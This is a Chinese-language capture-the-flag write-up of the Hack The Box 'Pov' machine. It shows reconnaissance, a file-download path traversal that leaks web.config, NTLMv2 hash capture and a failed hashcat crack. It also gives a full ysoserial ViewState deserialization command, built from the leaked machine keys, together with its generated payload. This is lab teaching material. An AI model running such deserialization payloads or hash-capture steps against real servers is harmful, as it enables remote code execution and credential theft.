---
title: HTB-Pov Writeup
date: 2026-03-07T15:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
  - HTB
  - Writeup
---
## 初始侦察

### Nmap 端口扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo nmap --min-rate 10000 -p- 10.129.230.183 
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-07 02:45 EST
Nmap scan report for 10.129.230.183
Host is up (0.11s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.77 seconds
```

靶机只开放了一个 TCP 端口 80。

### Nmap 详细信息扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo nmap -sT -sC -sV -O -p80 10.129.230.183               
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-07 02:46 EST
Nmap scan report for 10.129.230.183
Host is up (0.10s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
|_http-title: pov.htb
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.49 seconds
```

80 端口暴露了域名 `pov.htb`，添加进 hosts。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo bash -c 'echo "10.129.230.183 pov.htb" >> /etc/hosts' 
                                                                                                        
┌──(kali㉿kali)-[~/Work/Kali]
└─$ tail -n 1 /etc/hosts
10.129.230.183 pov.htb
```

## Web-80 端口渗透

访问 80 端口。

![](Pasted%20image%2020260307154901.png)

![](Pasted%20image%2020260307154953.png)

简单浏览发现网页暴露出了子域名 `dev.pov.htb` 和电子邮件 `sfitz.pov.htb`，进行更详细的子域名爆破。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo ffuf -H "Host: FUZZ.pov.htb" -u http://pov.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://pov.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.pov.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

dev                     [Status: 302, Size: 152, Words: 9, Lines: 2, Duration: 99ms]
:: Progress: [4989/4989] :: Job [1/1] :: 408 req/sec :: Duration: [0:00:18] :: Errors: 0 ::
```

粗略爆破只发现这一个子域名，补充进 hosts 。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ tail -n 1 /etc/hosts
10.129.230.183 pov.htb dev.pov.htb
```

获取网站请求头发现使用的技术栈是 `asp.net`。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ curl -I http://pov.htb
HTTP/1.1 200 OK
Content-Length: 12330
Content-Type: text/html
Last-Modified: Thu, 11 Jan 2024 15:08:44 GMT
Accept-Ranges: bytes
ETag: "9f75a811a044da1:0"
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
Date: Sat, 07 Mar 2026 07:58:59 GMT
```

暂时放弃，查看子域名的界面。访问 `dev.pov.htb` 自动重定向至 `/portfolio/defualt.aspx` 界面，进行更详细的目录爆破。

```bash
┌──(kali㉿kali)-[~/Work/Kali]                                                                           
└─$ sudo gobuster dir -u http://dev.pov.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.
txt --exclude-length 188                                                                     
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.pov.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Exclude Length:          188
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 302) [Size: 157] [--> http://dev.pov.htb/portfolio/index]
/news                 (Status: 302) [Size: 156] [--> http://dev.pov.htb/portfolio/news]
/images               (Status: 302) [Size: 158] [--> http://dev.pov.htb/portfolio/images]
/full                 (Status: 302) [Size: 156] [--> http://dev.pov.htb/portfolio/full]
/2006                 (Status: 302) [Size: 156] [--> http://dev.pov.htb/portfolio/2006]
/contact              (Status: 302) [Size: 159] [--> http://dev.pov.htb/portfolio/contact]
/download             (Status: 302) [Size: 160] [--> http://dev.pov.htb/portfolio/download]
/crack                (Status: 302) [Size: 157] [--> http://dev.pov.htb/portfolio/crack]
/serial               (Status: 302) [Size: 158] [--> http://dev.pov.htb/portfolio/serial]
/12                   (Status: 302) [Size: 154] [--> http://dev.pov.htb/portfolio/12]
/warez                (Status: 302) [Size: 157] [--> http://dev.pov.htb/portfolio/warez]
/about                (Status: 302) [Size: 157] [--> http://dev.pov.htb/portfolio/about]
/logo                 (Status: 302) [Size: 156] [--> http://dev.pov.htb/portfolio/logo]
/search               (Status: 302) [Size: 158] [--> http://dev.pov.htb/portfolio/search]
/10                   (Status: 302) [Size: 154] [--> http://dev.pov.htb/portfolio/10]
/new                  (Status: 302) [Size: 155] [--> http://dev.pov.htb/portfolio/new]
/11                   (Status: 302) [Size: 154] [--> http://dev.pov.htb/portfolio/11]
/spacer               (Status: 302) [Size: 158] [--> http://dev.pov.htb/portfolio/spacer]
/cgi-bin              (Status: 302) [Size: 159] [--> http://dev.pov.htb/portfolio/cgi-bin]
...
...
```

扫出过多的目录，暂时放弃，继续观察网站。网站上有关于 Stephen FItz 的详细介绍，他的编程语言偏好是 Js、ASP.NET、PHP。


![](Pasted%20image%2020260307160917.png)

还有 What People Say About Me。

![](Pasted%20image%2020260307161026.png)

其中 Michael Abra 说他的 ASP.NET 程序并不安全。

![](Pasted%20image%2020260307161129.png)

使用 BurpSuite 抓包下载简历界面进行分析。

![](Pasted%20image%2020260307161857.png)

发现参数部分有下载的简历 `cv.pdf`，尝试能否读取别的文件。

可以读取 `hosts` 文件，尝试读取 `default.aspx` 文件。

![](Pasted%20image%2020260307211504.png)

读取发现 `default.aspx` 文件还暴露了一个文件 `index.aspx.cs`，继续读取。

![](Pasted%20image%2020260307211610.png)

这个源码是一个 ASP.NET 的文件下载后端处理程序，通过正则表达式过滤字符串来防止遍历。

![](Pasted%20image%2020260307211711.png)

## NTLM 嗅探

在 Kali 中建立 smb 共享。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo impacket-smbserver Enil . -smb2support
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```

在 Repeater 中发送请求至 Kali 主动产生流量，捕捉 ntlm 认证。

![](Pasted%20image%2020260307212459.png)

使用 hashcat 破解捕捉到的 ntlmv2。

```bash
┌──(kali㉿kali)-[~/Work/Kali]                                                                                                                                                     
└─$ sudo hashcat -m 5600 "sfitz::POV:aaaaaaaaaaaaaaaa:f81449b75ac6d8d067a4263a89017faf:0101000000000000809308c735aedc0133a733dccb3bd678000000000100100077004c00440043006a005900450
070000300100077004c00440043006a00590045007000020010006a0075005a0072005200410065005300040010006a0075005a007200520041006500530007000800809308c735aedc0106000400020000000800300030000
0000000000000000000002000003decb96a94ca9d11758ea5764f02eb4e13f900522ca6ff04c77af5c86f93aaa60a001000000000000000000000000000000000000900200063006900660073002f00310030002e003100300
02e00310036002e00350038000000000000000000" /usr/share/wordlists/rockyou.txt              
[sudo] password for kali:                                                                                                                                                         
hashcat (v6.2.6) starting                                                                                                                                                         
                                                                                                                                                                                  
OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]                              
====================================================================================================================================================                              
* Device #1: cpu-sandybridge-13th Gen Intel(R) Core(TM) i9-13900HX, 13912/27888 MB (4096 MB allocatable), 8MCU                                                                    
                                                                                                                                                                                  
Minimum password length supported by kernel: 0                                                                                                                                    
Maximum password length supported by kernel: 256                                                                                                                                  
                                                                                                                                                                                  
Hashes: 1 digests; 1 unique digests, 1 unique salts                                                                                                                               
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates                                                                                                      
Rules: 1                                                                                                                                                                          
                                                                                                                                                                                  
Optimizers applied:                                                                      
* Zero-Byte                                                                                                                                                                       
* Not-Iterated                                                                                                                                                                    
* Single-Hash                                                                                                                                                                     
* Single-Salt                                                                                                                                                                     
                                                                                                                                                                                  
ATTENTION! Pure (unoptimized) backend kernels selected.                                                                                                                           
Pure kernels can crack longer passwords, but drastically reduce performance.                                                                                                      
If you want to switch to optimized kernels, append -O to your commandline.                                                                                                        
See the above message to find out about the exact limits.                                                                                                                         
                                                                                                                                                                                  
Watchdog: Temperature abort trigger set to 90c                                           

Host memory required for this attack: 2 MB                                               
                                                                                         
Dictionary cache hit:                       
* Filename..: /usr/share/wordlists/rockyou.txt                                           
* Passwords.: 14344385                      
* Bytes.....: 139921507                     
* Keyspace..: 14344385                      

Cracking performance lower than expected?                                                                                                                                         

* Append -O to the commandline.                                                          
  This lowers the maximum supported password/salt length (usually down to 32).                                                                                                    

* Append -w 3 to the commandline.                                                        
  This can cause your screen to lag.                                                     

* Append -S to the commandline.                                                          
  This has a drastic speed impact but can be better for specific attacks.                                                                                                         
  Typical scenarios are a small wordlist but a large ruleset.                                                                                                                     

* Update your backend API runtime / driver the right way:                                                                                                                         
  https://hashcat.net/faq/wrongdriver                                                    

* Create more work items to make use of your parallelization power:                                                                                                               
  https://hashcat.net/faq/morework                                                       

Approaching final keyspace - workload adjusted.                                                                                                                                   

Session..........: hashcat                                                                                                                                                        
Status...........: Exhausted                                                             
Hash.Mode........: 5600 (NetNTLMv2)                                                      
Hash.Target......: SFITZ::POV:aaaaaaaaaaaaaaaa:f81449b75ac6d8d067a4263...000000                                                                                                   
Time.Started.....: Sat Mar  7 08:27:42 2026 (5 secs)                                                                                                                              
Time.Estimated...: Sat Mar  7 08:27:47 2026 (0 secs)                                                                                                                              
Kernel.Feature...: Pure Kernel                                                           
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)                                                                                                                        
Guess.Queue......: 1/1 (100.00%)                                                         
Speed.#1.........:  2546.6 kH/s (1.38ms) @ Accel:1024 Loops:1 Thr:1 Vec:8                                                                                                         
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)                                                                                                         
Progress.........: 14344385/14344385 (100.00%)                                           
Rejected.........: 0/14344385 (0.00%)                                                    
Restore.Point....: 14344385/14344385 (100.00%)                                           
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1                                                                                                                             
Candidate.Engine.: Device Generator                                                      
Candidates.#1....: $HEX[206b72697374656e616e6e65] -> $HEX[042a0337c2a156616d6f732103]                                                                                             
Hardware.Mon.#1..: Util: 63%                                                             

Started: Sat Mar  7 08:27:40 2026                                                        
Stopped: Sat Mar  7 08:27:49 2026
```

破解失败。

## 枚举敏感信息

枚举 web.config 的信息。

![](Pasted%20image%2020260307213822.png)

这个 config 将错误重定向至 `portfolio` 界面，其中反序列化的硬编码 MachineKey 被暴露出来，使用 ysoseria.net 定制反序列化的 payload。

## 反序列化漏洞评估

```bash
(base) PS D:\Github Study\Ysoserial\ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9\Release> .\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "ping -n 5 10.10.16.58" --path="/portfolio/default.aspx" --apppath="/portfolio" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
nPqQpSCSipKDKDRkvAbqlarE3rNhxwHi0V5sm%2FegatIQPOCTTuP%2FEzPeUBB5zY8jI808NeqanFQchAWdI%2Bpv5v%2FwhkB4eWZxP%2B%2FywwzGRpYP7qXWXoPi8Ekv%2B9eJAxCIkMGJKvk0ySLq0qhcX%2Fi2dkhY5f8aSLnOWs1O6LVEnEyFMgVa9H9piqSrGB2vjlftTAsu1Rfn7bCQ6lIBo5TkhSMZsuX%2F4w1asgGQwp5DXxisamN7RS%2FRg2N%2FiUMUBeCiM2Zp6GDn0GkYn1rnU9qpnaH%2FXXZWdZQ0iVOmq1WkylOoJIMRFDlSHahAjq73xxxVa%2BnOEtjmb1j7jcMgjgI9tP2fKa1GXiaXf%2FwvYF8k88bbFT%2FKKoTZnM4mqgd1Y50SI9L0ycIoYqNzVvlp9uQ5%2FZKagsAK2EM%2BU6lvcUbQplA5nZqyP8BUiWybT2rEKjjkffs7fSVpdBpebxBiH9Lj5%2BAhAgZhCDqHWwWolFLhiq7fKDd3wIpClRzwmVmgQ66yKfDWdqSr4RojC3841YVigGMHb7Oya565WYW1dJAeoDFr9WpIYoRqkdW6DyeeSfx%2BuEiShCcVnZK%2FD2KmFShcO97WihcJVaarmF4ceRMx4%2FQrfvIha9G1PxNH6732DFcW6C2YAbMPCn4UOyzDlcRP4ZT2oL5DNq3OVzO5kDLDOLvnD%2FipRbr4szmTJZ0MZzNQ2lr92z2iUWNYZV8AOy3E%2F8OJ01cft0C67QUpTIE5%2BN34qHDLCvalL1TOsJCE%2BSZxtZesb2DZjxMRTciWv%2BoF53TWWEUJwIZV%2F6EVQBA6ar9ptwfnxZ01K%2BR9%2F5RamrrGePOlqt8JDoJGl9BeVW16%2By%2FqS0nvEBC2MgapbRlHLguGHGEOMfLCxyfLeZhiU6BPxV6EvjFiMMs%2Bbs6Lin106TVXLjnw%2FPm7PVa%2BS1XL2PqiNZbsuZirWvR7FJChJPvJbEJz8Yvhd1oOJbajtIISeLWp5nXaVZmNxwXmxUgGAy9AoUNlvFQDUj7oIOpg6fRCFaFskIDmOZayJUBN4Nr4l7usLUUZIJPVp8AcVPcc%2FKMRgKRPxF5mj%2BSA%2FhR1syk91hVCst28UKZ6U8%2BbRYr40pEBH9PnsUSQ%2Fmo85quRlR12fB9RlUI%2FHOXYY61nfVXvUv4xX07XgdR5kvg7v7jjtdt3nptfeY6s6exQUEZlJ1r0tD9RCwkJtvCe8rLkZmYMyDcYk8WChqac86oDRpgLAY0jvfC3yb3hqZ%2BJMQOqtD6GcmiciAY27TZjgzlMc%2FpGSshcBwwJXzWepcCM%2BYG9XAdrJtc%3D
```

在 Kali 中捕获流量。

![](Pasted%20image%2020260308000800.png)

获取到 Ping 包，制作下一步的反弹 Shell。

```bash

```